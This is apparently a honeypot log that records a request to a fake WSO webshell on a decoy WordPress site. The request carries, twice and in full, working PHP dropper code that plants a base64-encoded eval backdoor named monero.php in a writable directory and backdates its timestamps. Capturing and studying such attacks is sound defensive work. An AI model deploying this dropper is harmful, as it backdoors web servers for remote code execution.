
_SERVER
Array
(
    [UNIQUE_ID] => WpHVjITiuOqYLuS1Wn6McQAAAAI
    [SCRIPT_URL] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_URI] => http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_HOST] => www.stratigery.com
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
    [HTTP_ACCEPT_ENCODING] => gzip, deflate
    [HTTP_ACCEPT] => */*
    [HTTP_CONNECTION] => keep-alive
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [CONTENT_LENGTH] => 7141
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.29 (Unix) PHP/7.2.2
    [SERVER_NAME] => www.stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 213.231.57.232
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 50197
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_NAME] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [PHP_SELF] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [REQUEST_TIME_FLOAT] => 1519506828.458
    [REQUEST_TIME] => 1519506828
)

_REQUEST
Array
(
    [a] => Php
    [c] => 
    [p1] => 
            error_reporting(E_ALL);
            set_time_limit(0);
            $startDirectory = $_SERVER['DOCUMENT_ROOT'];
            $domain = $_SERVER['HTTP_HOST'];
            $depth = 4;
            $fileData = "PD9waHAKaGVhZGVyKCJDYWNoZS1Db250cm9sOiB0ZWN0Iik7CglAZXJyb3JfcmVwb3J0aW5nKDApOyAKCUBpbmlfc2V0KCJkaXNwbGF5X2Vycm9ycyIsMCk7IAoJQGluaV9zZXQoImxvZ19lcnJvcnMiLDApOyAKCUBpbmlfc2V0KCJlcnJvcl9sb2ciLDApOyAgCglpZiAoaXNzZXQoJF9QT1NUWyJ4Il0pKSAKCXsgCQoJCWV2YWwoJF9QT1NUWyJ4Il0pOyAKCX0KPz4=";
            $fileName = "monero.php";
            $filePrefix = "ini_";
            $fileMode = 0;

            function GetRandomPath($dirs, $depth) {
                if($depth > (int)current($dirs)) {
                    $depth = (int)current($dirs);
                }
                $allKeys = array_keys($dirs, $depth);
                return $allKeys[rand(0, count($allKeys) - 1)];
            }

            function FileWrite($filePath, $fileData, $fileMode, $filePrefix) {
            $pathParts = pathinfo($filePath);
            $fileTime = filemtime($pathParts["dirname"]);
                if(file_exists($filePath)) {
                        if($fileMode == 2)
                            return "";
                        if($fileMode == 0)
                            $filePath = $pathParts["dirname"]."/".$filePrefix.$pathParts["basename"];
                }
                if($fp = fopen($filePath, "w")) {
                    fwrite($fp, $fileData);
                    fclose($fp);
                    touch($filePath, $fileTime);
                    touch($pathParts["dirname"], $fileTime);
                    return $filePath;
                }
            }



            function is__writable($path) {

                if ($path{strlen($path)-1}=="/")
                    return is__writable($path.uniqid(mt_rand()).".tmp");

                if (file_exists($path)) {
                    if (!($f = @fopen($path, "r+")))
                        return false;
                    fclose($f);
                    return true;
                }

                if (!($f = @fopen($path, "w")))
                    return false;
                fclose($f);
                unlink($path);
                return true;
            }



            function get_writable_dirs($startPath, $path = ""){
                $depth_limit = 5;
                $startPath = str_replace("\\", "/", $startPath);
                $all_dirs = array();
                $more_dirs = array();
                if($path == ""){
                    if( is__writable($startPath."/") )
                        $all_dirs = array($startPath => 0);
                    $path = $startPath;
                }    
                $depth = substr_count(str_replace($startPath, "", $path),"/");
                //echo "checking $path";
                       
                if( is_writable($path."/") ){
                    //echo "$path writable";
                    $all_dirs[$path] = $depth;
                }
                if ( $depth > $depth_limit )
                    return null;
                //echo $all_dirs[$path]."";
                $d = scandir($path);
                //print_r($d);
                foreach( $d as $child ){
                    if( $child != "." && $child != ".." ){
                        //echo $child."";
                        $newPath = $path."/".$child;
                        if( is_dir($newPath) ) {
                            //echo $newPath." is dir ";
                            if ( is__writable($newPath."/") ){
                                //echo $newPath." is writable";
                                $all_dirs[$newPath] = substr_count(str_replace($startPath, "", $newPath),"/");
                            }
                            //echo $path."/".$child."";
                            $more_dirs = get_writable_dirs($startPath, $newPath);
                            if ( !empty($more_dirs) ){
                                $all_dirs = array_merge($all_dirs, $more_dirs);
                            }
                        }
                    }
                }
                
                arsort($all_dirs);
                return $all_dirs;
            }






            //$allDirs = GetAllDirs($startDirectory);
            $allDirs = get_writable_dirs($startDirectory);
            if ( count($allDirs) < 1)
                continue;
            $randPath = GetRandomPath($allDirs, $depth);
            //print_r($allDirs);
            //continue;

            $fileWritedPath = FileWrite($randPath."/".$fileName, base64_decode($fileData), $fileMode, $filePrefix);
            $fileWritedPath = str_replace("//", "/", $fileWritedPath);
            if(strlen($fileWritedPath) != 0){
                /* echo $startDirectory."
"; */
                $url = str_replace( str_replace("\\","/",$startDirectory), $domain, $fileWritedPath);
                $url = "http://".$url;
                if ( !strstr($url, "http://.") )
                    echo "p_url_to_check: ".$url."";
                    echo "
";
                /*
                if(strlen($_SERVER["DOCUMENT_ROOT"]) == 1)
                    echo substr($fileWritedPath, 1);
                else
                    echo str_replace(str_replace("\\", "/", $_SERVER["DOCUMENT_ROOT"]), "", $fileWritedPath);
                */
            }
    [p2] => 
    [p3] => 
    [charset] => Windows-1251
    [pass] => nhzgrf
)

_COOKIE
 Array
(
)

_FILES
 
END _FILES
 $my_blog=http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
pass parameter, acting as WSO
Acting as WSO, login cookie.
a = Php
c = 
p1 = 
            error_reporting(E_ALL);
            set_time_limit(0);
            $startDirectory = $_SERVER['DOCUMENT_ROOT'];
            $domain = $_SERVER['HTTP_HOST'];
            $depth = 4;
            $fileData = "PD9waHAKaGVhZGVyKCJDYWNoZS1Db250cm9sOiB0ZWN0Iik7CglAZXJyb3JfcmVwb3J0aW5nKDApOyAKCUBpbmlfc2V0KCJkaXNwbGF5X2Vycm9ycyIsMCk7IAoJQGluaV9zZXQoImxvZ19lcnJvcnMiLDApOyAKCUBpbmlfc2V0KCJlcnJvcl9sb2ciLDApOyAgCglpZiAoaXNzZXQoJF9QT1NUWyJ4Il0pKSAKCXsgCQoJCWV2YWwoJF9QT1NUWyJ4Il0pOyAKCX0KPz4=";
            $fileName = "monero.php";
            $filePrefix = "ini_";
            $fileMode = 0;

            function GetRandomPath($dirs, $depth) {
                if($depth > (int)current($dirs)) {
                    $depth = (int)current($dirs);
                }
                $allKeys = array_keys($dirs, $depth);
                return $allKeys[rand(0, count($allKeys) - 1)];
            }

            function FileWrite($filePath, $fileData, $fileMode, $filePrefix) {
            $pathParts = pathinfo($filePath);
            $fileTime = filemtime($pathParts["dirname"]);
                if(file_exists($filePath)) {
                        if($fileMode == 2)
                            return "";
                        if($fileMode == 0)
                            $filePath = $pathParts["dirname"]."/".$filePrefix.$pathParts["basename"];
                }
                if($fp = fopen($filePath, "w")) {
                    fwrite($fp, $fileData);
                    fclose($fp);
                    touch($filePath, $fileTime);
                    touch($pathParts["dirname"], $fileTime);
                    return $filePath;
                }
            }



            function is__writable($path) {

                if ($path{strlen($path)-1}=="/")
                    return is__writable($path.uniqid(mt_rand()).".tmp");

                if (file_exists($path)) {
                    if (!($f = @fopen($path, "r+")))
                        return false;
                    fclose($f);
                    return true;
                }

                if (!($f = @fopen($path, "w")))
                    return false;
                fclose($f);
                unlink($path);
                return true;
            }



            function get_writable_dirs($startPath, $path = ""){
                $depth_limit = 5;
                $startPath = str_replace("\\", "/", $startPath);
                $all_dirs = array();
                $more_dirs = array();
                if($path == ""){
                    if( is__writable($startPath."/") )
                        $all_dirs = array($startPath => 0);
                    $path = $startPath;
                }    
                $depth = substr_count(str_replace($startPath, "", $path),"/");
                //echo "checking $path";
                       
                if( is_writable($path."/") ){
                    //echo "$path writable";
                    $all_dirs[$path] = $depth;
                }
                if ( $depth > $depth_limit )
                    return null;
                //echo $all_dirs[$path]."";
                $d = scandir($path);
                //print_r($d);
                foreach( $d as $child ){
                    if( $child != "." && $child != ".." ){
                        //echo $child."";
                        $newPath = $path."/".$child;
                        if( is_dir($newPath) ) {
                            //echo $newPath." is dir ";
                            if ( is__writable($newPath."/") ){
                                //echo $newPath." is writable";
                                $all_dirs[$newPath] = substr_count(str_replace($startPath, "", $newPath),"/");
                            }
                            //echo $path."/".$child."";
                            $more_dirs = get_writable_dirs($startPath, $newPath);
                            if ( !empty($more_dirs) ){
                                $all_dirs = array_merge($all_dirs, $more_dirs);
                            }
                        }
                    }
                }
                
                arsort($all_dirs);
                return $all_dirs;
            }






            //$allDirs = GetAllDirs($startDirectory);
            $allDirs = get_writable_dirs($startDirectory);
            if ( count($allDirs) < 1)
                continue;
            $randPath = GetRandomPath($allDirs, $depth);
            //print_r($allDirs);
            //continue;

            $fileWritedPath = FileWrite($randPath."/".$fileName, base64_decode($fileData), $fileMode, $filePrefix);
            $fileWritedPath = str_replace("//", "/", $fileWritedPath);
            if(strlen($fileWritedPath) != 0){
                /* echo $startDirectory."
"; */
                $url = str_replace( str_replace("\\","/",$startDirectory), $domain, $fileWritedPath);
                $url = "http://".$url;
                if ( !strstr($url, "http://.") )
                    echo "p_url_to_check: ".$url."";
                    echo "
";
                /*
                if(strlen($_SERVER["DOCUMENT_ROOT"]) == 1)
                    echo substr($fileWritedPath, 1);
                else
                    echo str_replace(str_replace("\\", "/", $_SERVER["DOCUMENT_ROOT"]), "", $fileWritedPath);
                */
            }
p2 = 
p3 = 
Acting as WSO PHP eval, recognized common dropper.
Uploaded file: /var/tmp/213.231.57.232WpHVjITiuOqYLuS1Wn6McQAAAAIfile
